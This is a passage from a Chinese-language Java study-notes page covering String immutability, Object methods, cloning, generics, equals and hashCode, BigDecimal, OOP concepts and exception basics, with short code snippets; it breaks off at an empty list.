<h3 id="String不可变"><a href="#String不可变" class="headerlink" title="String不可变"></a>String不可变</h3><ul>
<li>String 不可变是因为在 JDK 中 String 类被声明为一个 final 类，且类内部的 <code>value</code> 字符数组也是 final 的，</li>
<li>只有当字符串是不可变时<strong>字符串池</strong>才有可能实现<strong>，</strong>字符串池的实现可以在运行时节约很多 heap 空间，因为可能存在多个不同的字符串变量都指向字符串池中的同一个字符串；如果字符串是可变的则会引起很严重的安全问题，因为字符串是不可变的，所以它的<strong>值</strong>是不可改变的，否则黑客们可以钻到空子改变字符串指向的对象的值造成安全漏洞</li>
<li>因为字符串是不可变的，所以是<strong>多线程安全</strong>的，同一个字符串实例可以被多个线程共享，这样便不用因为线程安全问题而使用同步，字符串自己便是线程安全的；</li>
<li>字符串是不可变的所以在它创建的时候 <strong>hashcode</strong> 就被缓存了，不变性也保证了 hash 码的唯一性，不需要重新计算，这就使得字符串很适合作为 Map 的键，字符串的<strong>处理速度</strong>要快过其它的键对象，这就是 HashMap 中的键往往都使用字符串的原因。</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">String</span></span></span><br><span class="line"><span class="class">    <span class="keyword">implements</span> <span class="title">java</span>.<span class="title">io</span>.<span class="title">Serializable</span>, <span class="title">Comparable</span>&lt;<span class="title">String</span>&gt;, <span class="title">CharSequence</span> </span>&#123;</span><br><span class="line">   	<span class="comment">//字符数组</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">char</span> value[];</span><br><span class="line">    <span class="comment">//Cache the hash code for the string </span></span><br><span class="line">	<span class="comment">//缓存字符串的hashcode</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> hash;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">String</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.value = <span class="string">&quot;&quot;</span>.value;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">String</span><span class="params">(String original)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.value = original.value;</span><br><span class="line">        <span class="keyword">this</span>.hash = original.hash;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="5-Object类有哪些方法"><a href="#5-Object类有哪些方法" class="headerlink" title="5.Object类有哪些方法"></a>5.Object类有哪些方法</h2><p>final和native修饰</p>
<ul>
<li>不能覆写</li>
<li>实现在C/C++层</li>
</ul>
<h3 id="getClass"><a href="#getClass" class="headerlink" title="getClass"></a>getClass</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">native</span> Class&lt;?&gt; getClass()</span><br></pre></td></tr></table></figure>

<p>getClass 方法用于获取对象的运行时类,在反射的时候用的比较多。</p>
<h3 id="hashCode"><a href="#hashCode" class="headerlink" title="hashCode"></a>hashCode</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">()</span></span>;</span><br></pre></td></tr></table></figure>

<p>hashCode 方法用于获取对象的 hash 值。</p>
<h3 id="equals"><a href="#equals" class="headerlink" title="equals"></a>equals</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">equals</span><span class="params">(Object obj)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">this</span> == obj);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>equals 方法用于比较两个对象是否相等。</p>
<h3 id="clone"><a href="#clone" class="headerlink" title="clone"></a>clone</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">native</span> Object <span class="title">clone</span><span class="params">()</span> <span class="keyword">throws</span> CloneNotSupportedException</span>;</span><br></pre></td></tr></table></figure>

<ul>
<li>方法是<code>native</code>实现信息的拷贝</li>
<li><code>protected</code>修饰，外部无法调用，需要子类重写</li>
<li>如果没有实现 <code>Cloneable</code> 接口，调用 的时候会抛出 <code>CloneNotSupportedException</code> 异常。</li>
</ul>
<p>如果外部需要调用 <code>clone</code> 方法，要么通过反射，要么将它覆写成 public 方法。</p>
<p>这个 Cloneable 接口中没有定义任何方法，所以实现 <code>Cloneable</code> 接口没有别的作用，就代表具备了使用 clone 方法的权利。</p>
<h3 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="toString"></a>toString</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> getClass().getName() + <span class="string">&quot;@&quot;</span> + Integer.toHexString(hashCode());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>toString 方法就是把对象用字符串的形式表示，<code>类名@hashCode</code>，直接打印对象输出就是这样的格式</p>
<h3 id="wait-notify"><a href="#wait-notify" class="headerlink" title="wait/notify"></a>wait/notify</h3><p>wait() 方法会将当前线程挂起，等待某个条件满足。当其他线程运行使得这个条件满足了，其他线程会调用 <code>notify()</code> 或者 <code>notifyAll()</code> 方法。</p>
<p>只能用在同步方法或者同步代码块中使用，获得当前对象的锁资源，否则会在运行时抛出 <code>IllegalMonitorStateException</code>。</p>
<h3 id="finalize"><a href="#finalize" class="headerlink" title="finalize"></a>finalize</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">finalize</span><span class="params">()</span> <span class="keyword">throws</span> Throwable </span>&#123; &#125;</span><br></pre></td></tr></table></figure>

<p><code>finalize()</code> 是 GC 准备回收对象的时候调用来执行清理工作的。</p>
<h2 id="6-深克隆和浅克隆"><a href="#6-深克隆和浅克隆" class="headerlink" title="6.深克隆和浅克隆"></a>6.深克隆和浅克隆</h2><p><code>clone()</code>是<code>Object</code>的<code>protected</code>方法，因此其他类不能直接去调用该类实例的<code>clone</code>方法,需要对clone进行重写，重写时需要继承<code>Cloneable</code>标记接口，否则会报<code>CloneNotSupportedException</code>。</p>
<h3 id="浅克隆"><a href="#浅克隆" class="headerlink" title="浅克隆"></a>浅克隆</h3><p>当对象的属性中有引用变量时，实际上<strong>克隆后的对象跟原有对象的引用变量所指向的是同一地址</strong>，如果此时修改引用变量的值，会使两个对象的引用变量都发生改变</p>
<h3 id="深克隆"><a href="#深克隆" class="headerlink" title="深克隆"></a>深克隆</h3><p><strong>将引用对象也做一份拷贝</strong></p>
<p>使用<code>clone()</code>方法来拷贝一个对象即复杂又有风险，它会抛出异常，并且还需要类型转换</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Sheep</span> <span class="keyword">implements</span> <span class="title">Cloneable</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> Date birthday;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">protected</span> Object <span class="title">clone</span><span class="params">()</span> <span class="keyword">throws</span> CloneNotSupportedException </span>&#123;</span><br><span class="line">        Object obj = <span class="keyword">super</span>.clone();</span><br><span class="line">        <span class="comment">//深克隆添加如下代码：</span></span><br><span class="line">        Sheep sheep = (Sheep)obj;</span><br><span class="line">        sheep.birthday = (Date) <span class="keyword">this</span>.birthday.clone();<span class="comment">//把属性也进行克隆</span></span><br><span class="line">        <span class="keyword">return</span> sheep;</span><br><span class="line">    &#125;  </span><br><span class="line">	  <span class="comment">//省略getter，setter和toString方法</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="泛型"><a href="#泛型" class="headerlink" title="泛型"></a>泛型</h1><h2 id="1-什么是泛型-泛型上下边界"><a href="#1-什么是泛型-泛型上下边界" class="headerlink" title="1.什么是泛型,泛型上下边界"></a>1.什么是泛型,泛型上下边界</h2><ol>
<li><p>泛型是参数化类型，使用广泛的类型，声明时使用泛型，使用时确定类型</p>
</li>
<li><p>泛型是一个重要特性是<strong>泛型擦除</strong>，由于JVM并不知道泛型的存在，泛型在编译期就被转化为普通的类，目的是避免创建过多的类造成性能上的损耗</p>
</li>
<li><p>泛型在数据取出时会进行一个<strong>强制类型转换</strong>(此时若是创建泛型数组，进行强制类型转换时会出现<code>ClassCastException</code>!)</p>
</li>
</ol>
<h3 id="上下边界"><a href="#上下边界" class="headerlink" title="上下边界"></a>上下边界</h3><ol>
<li><p>范型上限 <code>&lt; ? extends Fruit &gt;</code>：表示所能接收类型必须是指定类或者其子类。</p>
</li>
<li><p>范型下限 <code>&lt; ? super Apple &gt;</code>：表示所能接收类型必须是指定类或者其父类。</p>
</li>
</ol>
<h1 id="equals-1"><a href="#equals-1" class="headerlink" title="equals"></a>equals</h1><h2 id="1-与equals"><a href="#1-与equals" class="headerlink" title="1.== 与equals"></a>1.== 与equals</h2><h3 id="区别"><a href="#区别" class="headerlink" title="区别"></a>区别</h3><ol>
<li><p>对于基本数据类型，“==” 比较的是值是否相等</p>
</li>
<li><p>对于引用数据类型，“==” 比较的是内存地址是否相等</p>
</li>
</ol>
<blockquote>
<p>equals本质上来说是使用了==作为其底层的实现，但是java中很多类都对equals做了重写，使其可以对值进行判断(String)</p>
</blockquote>
<h3 id="使用注意事项"><a href="#使用注意事项" class="headerlink" title="使用注意事项"></a>使用注意事项</h3><ul>
<li>Object的<code>equals</code>方法容易抛空指针异常，应使用常量或确定有值的对象来调用<code>equals</code></li>
<li>更推荐使用<code>java.util.Objects.equals</code></li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">boolean</span> equals = Objects.equals(<span class="string">&quot;a&quot;</span>, <span class="string">&quot;b&quot;</span>);</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">equals</span><span class="params">(Object a, Object b)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 可以避免空指针异常。如果a==null的话此时a.equals(b)就不会得到执行，避免出现空指针异常。</span></span><br><span class="line">    <span class="keyword">return</span> (a == b) || (a != <span class="keyword">null</span> &amp;&amp; a.equals(b));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>所有整形包装类对象值的比较都必须使用<code>equals</code>方法</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Integer x = <span class="number">3</span>;<span class="comment">//将3自动装箱成Integer</span></span><br><span class="line">Integer y = <span class="number">3</span>;</span><br><span class="line">System.out.println(x == y);<span class="comment">// true</span></span><br><span class="line">Integer a = <span class="keyword">new</span> Integer(<span class="number">3</span>);</span><br><span class="line">Integer b = <span class="keyword">new</span> Integer(<span class="number">3</span>);</span><br><span class="line"><span class="keyword">int</span> c = <span class="number">3</span>;</span><br><span class="line">System.out.println(a == b);<span class="comment">//false</span></span><br><span class="line">System.out.println(a.equals(b));<span class="comment">//true</span></span><br><span class="line"></span><br><span class="line">System.out.println(a == x);<span class="comment">//false！！！</span></span><br><span class="line">System.out.println(a == c);<span class="comment">//true,将a自动拆箱成int再比较</span></span><br></pre></td></tr></table></figure>

<h2 id="2-重写equals方法同时也要重写hashcode"><a href="#2-重写equals方法同时也要重写hashcode" class="headerlink" title="2.重写equals方法同时也要重写hashcode"></a>2.重写equals方法同时也要重写hashcode</h2><blockquote>
<p>默认情况下，Object 的 <code>hashcode</code> 方法是本地方法，也就是用 C 或者 C++ 语言实现的，该方法直接返回对象的内存地址</p>
</blockquote>
<ul>
<li>hashcode 获取得到的是该对象在哈希表中的索引位置，是一个 int 类型的数据，称为哈希码，也叫<strong>散列码</strong></li>
<li>hashcode 只有在需要用到<strong>散列表</strong>(HashSet, Hashtable, HashMap)的情况下才需要，不然没有任何关系</li>
<li>使用实例</li>
</ul>
<blockquote>
<p>当在hashSet加入新对象，会先计算hashcode来判断对象加入的位置。</p>
<p>同时也会将该hashcode也已有对象的hashcode进行比较。</p>
<p>如果不同，则认为对象不同，直接加入</p>
<p>如果相同，会同时调用equals方法检查对象是否真的相同，如果相同，不会让其加入成功</p>
<p>不同则散列到其他位置</p>
</blockquote>
<ul>
<li>相关规定<ul>
<li>如果两个对象相等，则 hashcode 一定也是相同的、</li>
<li>两个对象相等,对两个对象分别调用 equals 方法都返回true</li>
<li><strong>两个对象有相同的hashcode 值，它们也不一定是相等</strong></li>
<li>hashCode() 的默认行为是对堆上的对象产生独特值。如果没有重写 hashCode()，则该 class 的两个对象无论如何都不会相等（即使这两个对象指向相同的数据）</li>
</ul>
</li>
</ul>
<h2 id="3-键盘输入俩种方式"><a href="#3-键盘输入俩种方式" class="headerlink" title="3.键盘输入俩种方式"></a>3.键盘输入俩种方式</h2><h3 id="通过Scanner"><a href="#通过Scanner" class="headerlink" title="通过Scanner"></a>通过<code>Scanner</code></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Scanner input = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">String s = input.nextLine();</span><br><span class="line">input.close();</span><br></pre></td></tr></table></figure>

<h3 id="通过BufferReader"><a href="#通过BufferReader" class="headerlink" title="通过BufferReader"></a>通过<code>BufferReader</code></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">BufferedReader input = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(System.in)）;</span><br><span class="line">String s = input.readLine();</span><br></pre></td></tr></table></figure>

<h2 id="4-BigDecimal用处"><a href="#4-BigDecimal用处" class="headerlink" title="4.BigDecimal用处"></a>4.BigDecimal用处</h2><blockquote>
<p>《阿里巴巴Java开发手册》中提到：浮点数之间的等值判断，基本数据类型不能用 == 来比较，包装数据类型不能用equals来判断，具体原理与浮点数的编码方式有关</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">float</span> a = <span class="number">1.0f</span>-<span class="number">0.9f</span>;</span><br><span class="line"><span class="keyword">float</span> b = <span class="number">0.9f</span>-<span class="number">0.8f</span>;</span><br><span class="line">System.out.println(a);<span class="comment">//0.100000024</span></span><br><span class="line">System.out.println(b);<span class="comment">//0.099999964</span></span><br><span class="line">System.out.println(a ==b);<span class="comment">//false</span></span><br></pre></td></tr></table></figure>

<p>上面代码出现false的原因是因为float数据存在<strong>精度丢失</strong>的情况。<strong>二进制小数无法精确的表述十进制小数</strong>，由于在计算十进制小数的过程中要先转化为二进制小数进行计算，这个过程就会出现精度丢失的情况。</p>
<p>使用<code>BigDecimal</code>来定义浮点数的值，再进行浮点数的计算操作</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">BigDecimal a = <span class="keyword">new</span> BigDecimal(<span class="string">&quot;1.0&quot;</span>);</span><br><span class="line">BigDecimal b = <span class="keyword">new</span> BigDecimal(<span class="string">&quot;0.9&quot;</span>);</span><br><span class="line">BigDecimal c = <span class="keyword">new</span> BigDecimal(<span class="string">&quot;0.8&quot;</span>);</span><br><span class="line">BigDecimal x = a.substract(b);<span class="comment">//0.1</span></span><br><span class="line">BigDecimal y = b.substract(c);<span class="comment">//0.1</span></span><br><span class="line">System.out.println(x.equals(y));<span class="comment">//true;</span></span><br></pre></td></tr></table></figure>

<h3 id="BigDecimal大小比较"><a href="#BigDecimal大小比较" class="headerlink" title="BigDecimal大小比较"></a>BigDecimal大小比较</h3><p><code>a.compareTo(b)</code>:返回-1表示小于，返回0表示等于，返回1表示大于</p>
<h3 id="保留几位小数"><a href="#保留几位小数" class="headerlink" title="保留几位小数"></a>保留几位小数</h3><p>通过<code>setScale</code>方法设置保留几位小数以及保留规则。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">BigDecimal m = <span class="keyword">new</span> BigDecimal(<span class="string">&quot;1.255433&quot;</span>);</span><br><span class="line">BigDecimal n = m.setScale(<span class="number">3</span>,BigDecimal.ROUND_HALF_DOWN);</span><br><span class="line">System.out.println(n);<span class="comment">// 1.255</span></span><br></pre></td></tr></table></figure>

<h3 id="BigDecimal使用注意事项"><a href="#BigDecimal使用注意事项" class="headerlink" title="BigDecimal使用注意事项"></a>BigDecimal使用注意事项</h3><blockquote>
<p>《阿里巴巴Java开发手册》提到：<strong>为了防止精度损失，禁止使用构造方法<code>BigDecimal(double)</code>的方式把double值转化为BigDecimal对象</strong>。该方法存在精度损失风险，在精确计算或值比较的场景中可能会导致业务逻辑异常。优先推荐使用参数为<code>String</code>的构造方法，或者 BigDecimal 的<code>valueOf</code>方法，此方法内存其实执行了 Double 的 toString，而 Double 的 toString 按 double 的实际能表达的精度对尾数进行了截断。</p>
</blockquote>
<h1 id="面向对象"><a href="#面向对象" class="headerlink" title="面向对象"></a>面向对象</h1><h2 id="1-接口与抽象类"><a href="#1-接口与抽象类" class="headerlink" title="1.接口与抽象类"></a>1.接口与抽象类</h2><h3 id="抽象类"><a href="#抽象类" class="headerlink" title="抽象类"></a>抽象类</h3><ul>
<li>抽象类和抽象方法使用<code>abstract</code>修饰，抽象方法不能有方法体；</li>
<li>一个类如果包含抽象方法，那么这个类必须声明为抽象类</li>
<li>抽象类不能被实例化；但是可以有构造方法，用来初始化抽象类内部的实例变量，由于子类构造第一句默认调用<code>super()</code>，没有的话子类将无法编译；继承抽象类的子类必须实现其抽象方法</li>
<li>抽象类不能被<code>final</code>修饰</li>
</ul>
<h3 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h3><ul>
<li>使用<code>interface</code>关键字，可以继承多个接口</li>
<li>不能有构造方法</li>
<li>接口字段默认为final和static，默认是public修饰，不能定义为protected和private</li>
<li>接口中可以定义常量，抽象方法，jdk8中可以默认方法，私有方法和静态方法</li>
</ul>
<h2 id="2-重写和重载"><a href="#2-重写和重载" class="headerlink" title="2.重写和重载"></a>2.重写和重载</h2><h3 id="重写"><a href="#重写" class="headerlink" title="重写"></a>重写</h3><blockquote>
<p>重写存在于继承体系之中，指子类实现了一个与父类在方法声明上完全相同的方法。</p>
</blockquote>
<p>为了满足里式替换原则，重写必须满足以下三个原则：</p>
<ul>
<li>子类的访问权限不能低于父类的访问权限</li>
<li>子类方法返回类型必须是父类方法返回类型或其子类</li>
<li>子类方法抛出的异常必须是父类方法抛出的异常或其子类</li>
</ul>
<blockquote>
<p>里氏替换原则中说，任何基类可以出现的地方，子类一定可以出现。</p>
</blockquote>
<p>调用一个方法时，先从本类中查找是否有相应的方法，如果没有就到父类中查找。如果没有就对参数进行转型，然后查看本类是否有相应的方法，没有就在父类中找，顺序如下：</p>
<ul>
<li><code>this.func(this)</code></li>
<li><code>super.func(this)</code></li>
<li><code>this.func(super)</code></li>
<li><code>super.func(super)</code></li>
</ul>
<h3 id="重载"><a href="#重载" class="headerlink" title="重载"></a>重载</h3><blockquote>
<p>存在于同一个类中，指一个方法与已经存在的方法名称上相同，但是<strong>参数类型、个数、顺序至少有一个不同</strong>,与返回值无关</p>
</blockquote>
<h2 id="3-类加载时的初始化顺序"><a href="#3-类加载时的初始化顺序" class="headerlink" title="3.类加载时的初始化顺序"></a>3.类加载时的初始化顺序</h2><ul>
<li><p>静态变量和静态代码块（两者谁先取决于代码顺序）</p>
</li>
<li><p>实例变量</p>
</li>
<li><p>构造代码块</p>
</li>
<li><p>构造函数的初始化</p>
</li>
</ul>
<blockquote>
<p>如果存在继承的情况，初始化顺序如下：</p>
</blockquote>
<ul>
<li>父类（静态变量，静态代码块）</li>
<li>子类（静态变量，静态代码块）</li>
<li>父类（实例变量，构造代码块）</li>
<li>父类（构造函数）</li>
<li>子类（实例变量，构造代码块）</li>
<li>子类（构造函数）</li>
</ul>
<h2 id="4-构造器是否可以重写"><a href="#4-构造器是否可以重写" class="headerlink" title="4.构造器是否可以重写"></a>4.构造器是否可以重写</h2><p><strong>父类的私有属性和构造方法不能被继承</strong>，所以<code>constructor</code>不能被重写，但是可以重载。</p>
<h2 id="5-对象实例与对象引用"><a href="#5-对象实例与对象引用" class="headerlink" title="5.对象实例与对象引用"></a>5.对象实例与对象引用</h2><ul>
<li>对象实例在堆内存，对象引用在栈空间</li>
<li>对象引用引用0个或1个对象实例，一个对象实例可以有n个引用</li>
</ul>
<h2 id="6-为什么java只有值传递"><a href="#6-为什么java只有值传递" class="headerlink" title="6.为什么java只有值传递"></a>6.为什么java只有值传递</h2><p>对于基本数据类型，java参数传递的是值的复制；</p>
<p>对于引用数据类型，java参数传递的是指向地址指针的拷贝。</p>
<blockquote>
<p>引用传递一般是对于对象型变量而言，传递的是该对象地址的一个副本，并不是原对象本身。</p>
<p>所以对引用对象进行操作会同时改变原有对象。</p>
</blockquote>
<h2 id="7-JVM、JRE、JDK的区别"><a href="#7-JVM、JRE、JDK的区别" class="headerlink" title="7.JVM、JRE、JDK的区别"></a>7.JVM、JRE、JDK的区别</h2><p><strong>JVM</strong></p>
<p>JVM是运行Java字节码的虚拟机，JVM有针对不同系统的特定实现，目的是使用相同的字节码，它们都会给出相同的结果，显示出java语言的跨平台性，实现”<strong>一次编译，随时可以运行</strong>“。</p>
<p><strong>JDK</strong></p>
<p>是功能健全的JavaSDK，拥有JRE拥有的一切，编译器Javac和工具Javadoc，能够创建和编译程序</p>
<p><strong>JRE</strong></p>
<p>java运行时环境，运行已编译java程序所需内容的集合，包括jvm，java类库，java命令和其他一些基础构件。但是，它不能用来创建程序</p>
<p>只是为了运行一下 Java 程序的话，那么你只需要安装 JRE 就可以了。</p>
<p>如果你需要进行一些 Java 编程方面的工作，那么你就需要安装 JDK 了。</p>
<p>如果要使用 JSP 部署 Web 应用程序，那么从技术上讲，您只是在应用程序服务器中运行 Java 程序。那你为什么需要 JDK 呢？因为应用程序服务器会将 JSP 转换为 Java servlet，并且需要使用 JDK 来编译 servlet</p>
<h2 id="8-什么是字节码-采用字节码的好处是什么"><a href="#8-什么是字节码-采用字节码的好处是什么" class="headerlink" title="8.什么是字节码?采用字节码的好处是什么?"></a>8.什么是字节码?采用字节码的好处是什么?</h2><p>在 Java 中，JVM 可以理解的代码就叫做字节码（即扩展名为 .class 的文件），它不面向任何特定的处理器，只面向虚拟机。</p>
<p>Java 语言通过字节码的方式，在一定程度上解决了传统解释型语言执行效率低的问题，同时又保留了解释型语言可移植的特点。所以 Java 程序运行时比较高效。</p>
<p>而且，由于字节码并不针对一种特定的机器，因此，Java 程序无须重新编译便可在多种不同操作系统的计算机上运行。</p>
<h2 id="9-final关键字的使用"><a href="#9-final关键字的使用" class="headerlink" title="9.final关键字的使用"></a>9.final关键字的使用</h2><h3 id="类"><a href="#类" class="headerlink" title="类"></a>类</h3><p>fianl修饰类时，表明这个类不能被继承。</p>
<p><code>final</code> 类中的成员变量可以根据需要设为 <code>final</code>，但是要注意 <strong><code>final</code> 类中的所有成员方法都会被隐式地指定为 <code>final</code> 方法</strong>。</p>
<h3 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h3><p>使用final方法的原因</p>
<ol>
<li><p>把方法锁定，以防任何继承类修改它的含义</p>
</li>
<li><p>效率，早期的Java实现版本中，会将 <code>final</code> 方法转为<strong>内嵌调用</strong>。但是如果方法过于庞大，可能看不到内嵌调用带来的任何性能提升。在最近的Java版本中，不需要使用 <code>final</code> 方法进行这些优化了。</p>
</li>
</ol>
<h3 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h3><ol>
<li><p>基本数据类型的变量，则其数值一旦在初始化之后便不能更改</p>
</li>
<li><p>引用类型的变量，保证这个引用类型变量所引用的地址不会发生改变，则在对其初始化之后便不能再让其指向另一个对象</p>
</li>
</ol>
<h2 id="10-amp-和-amp-amp"><a href="#10-amp-和-amp-amp" class="headerlink" title="10.&amp;和&amp;&amp;"></a>10.&amp;和&amp;&amp;</h2><p><code>&amp;</code> 运算符有两种用法：</p>
<ul>
<li>按位与；</li>
<li>逻辑与。</li>
</ul>
<p><code>&amp;&amp;</code> 运算符是<strong>短路与运算</strong>。</p>
<p>逻辑与跟短路与的差别是非常巨大的，虽然二者都要求运算符左右两端的布尔值都是 true 整个表达式的值才是 true 。</p>
<p><code>&amp;&amp;</code> 之所以称为短路运算是因为，如果 <code>&amp;&amp;</code> 左边的表达式的值是 <code>false</code>，右边的表达式会被直接短路掉，不会进行运算。</p>
<p>很多时候我们可能都需要用 <code>&amp;&amp;</code> 而不是 <code>&amp;</code>，例如在验证用户登录时判定<strong>用户名不是 null 而且不是空字符串</strong>，应当写为：<code>username != null &amp;&amp;!username.equals(&quot;&quot;)</code>，二者的顺序不能交换，更不能用 <code>&amp;</code> 运算符，因为第一个条件如果不成立，根本不能进行字符串的 <code>equals</code> 比较，否则会产生 <code>NullPointerException</code> 异常。</p>
<h2 id="11-Java中是如何支持正则表达式操作的？"><a href="#11-Java中是如何支持正则表达式操作的？" class="headerlink" title="11.Java中是如何支持正则表达式操作的？"></a>11.Java中是如何支持正则表达式操作的？</h2><p>Java 的 String 类中提供了支持正则表达式的操作，包括：<code>matches()</code>,<code>replaceAll()</code>,<code>replaceFirst()</code>,<code>split()</code>。</p>
<p>此外，Java 中还可以使用 <code>Pattern</code> 和 <code>Macher</code>类进行正则表达式操作。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String str = <span class="string">&quot;aaaaabbb&quot;</span>;</span><br><span class="line">str.matches(<span class="string">&quot;a*b&quot;</span>);</span><br><span class="line"></span><br><span class="line">Pattern p = Pattern.compile(<span class="string">&quot;a*b&quot;</span>);<span class="comment">//将正则表达式编译成Pattern类在内存中保存</span></span><br><span class="line">Matcher m = p.matcher(str);<span class="comment">//将执行匹配所涉及的状态保留再Matcher类中</span></span><br><span class="line"><span class="keyword">boolean</span> b = m.matches();<span class="comment">//执行Matcher类的matches方法进行比较</span></span><br></pre></td></tr></table></figure>

<h2 id="12-JAVA的简单数据类型和复合数据类型"><a href="#12-JAVA的简单数据类型和复合数据类型" class="headerlink" title="12.JAVA的简单数据类型和复合数据类型"></a>12.JAVA的简单数据类型和复合数据类型</h2><h3 id="基本数据类型"><a href="#基本数据类型" class="headerlink" title="基本数据类型"></a>基本数据类型</h3><ul>
<li>byte/8(1个字节)</li>
<li>char/16（2个字节）</li>
<li>short/16（2个字节）</li>
<li>int/32（4个字节）</li>
<li>float/32（4个字节）</li>
<li>long/64（8个字节）</li>
<li>double/64（8个字节）</li>
<li>boolean/1（1位）</li>
</ul>
<h3 id="复合数据类型"><a href="#复合数据类型" class="headerlink" title="复合数据类型"></a>复合数据类型</h3><p>Java 虚拟机（JVM）还定义了索引（reference）这种数据类型。</p>
<p>索引类型可以“引用”变量，由于 Java 没有明确地定义指针类型，所以索引类型可以被认为就是指向实际值或者指向变量所代表的实际值的指针。</p>
<p>一个对象可以被多于一个以上的索引所“指”。<strong>JVM从不直接对对象寻址而是操作对象的索引。</strong></p>
<p>索引类型分成三种，它们是：类（class）、接口（interface）和数组（array）。</p>
<p>索引类型可以引用动态创建的类实例、普通实例和数组。</p>
<p>索引还可以包含特殊的值，这就是 null 索引。null 索引在运行时上并没有对应的类型，但它可以被转换为任何类型。索引类型的默认值就是 null。</p>
<h1 id="异常处理"><a href="#异常处理" class="headerlink" title="异常处理"></a>异常处理</h1><p>所有的异常都有一个共同的祖先<code>java.lang</code>包中的的<code>Throwable类</code>。它有两个重要的子类：<code>Exception(异常)</code>和<code>Error(错误)</code>,二者都是java处理异常的重要子类</p>
<h2 id="Error"><a href="#Error" class="headerlink" title="Error"></a>Error</h2><p><strong>程序无法处理的错误</strong>，表示运行应用程序中较严重问题，表示代码执行时JVM出现的问题。</p>
<blockquote>
<p>java虚拟机运行错误(<code>VirtualMachineError</code>)、内存溢出(<code>OutofMemoryError</code>)，这些异常发生时，java虚拟机一般会选择线程终止</p>
</blockquote>
<p>这些错误是不可查的，因为它们在应用程序的控制和处理能力之外，而且绝大多数是程序运行时不允许出现的状况。对于设计合理的应用程序来说，即使确实发生了错误，本质上也不应该试图去处理它所引起的异常状况。</p>
<h2 id="Exception"><a href="#Exception" class="headerlink" title="Exception"></a>Exception</h2><p><strong>是程序本身可以处理的异常</strong></p>
<blockquote>
<p><code>Exception</code>类有一个重要的子类<code>RuntimeException</code>。该异常由Java虚拟机抛出。</p>
</blockquote>
<ul>
<li><code>ArrithmeticException</code>：算术运算异常，一个整数除以0时，会抛出该异常。</li>
<li><code>ClassNotFoundException</code></li>
<li><code>NullPointerException</code>：要访问的变量没有引用任何对象时抛出该异常。</li>
<li><code>IllegalArgumentException</code>：非法参数异常</li>
<li><code>ArrayIndexOutOfBoundsException</code>：下标越界异常</li>
</ul>
<blockquote>
<p>异常和错误的区别：异常能被程序本身处理，错误无法处理</p>
</blockquote>
<h2 id="Throwable类常用方法"><a href="#Throwable类常用方法" class="headerlink" title="Throwable类常用方法"></a>Throwable类常用方法</h2><ul>
<li><code>public String getMessage()</code>:返回异常发生时的详细信息</li>
<li><code>public string toString()</code>:返回异常发生时的简要描述</li>
<li><code>public string getLocalizedMessage()</code>:返回异常对象的本地化信息。使用<code>Throwable</code>的子类覆盖这个方法，可以声称本地化信息。如果子类没有覆盖该方法，则该方法返回的信息与<code>getMessage()</code>返回的结果相同</li>
<li><code>public void printStackTrace()</code>:在控制台上打印<code>Throwable</code>对象封装的异常信息</li>
</ul>
<h2 id="异常处理总结"><a href="#异常处理总结" class="headerlink" title="异常处理总结"></a>异常处理总结</h2><ul>
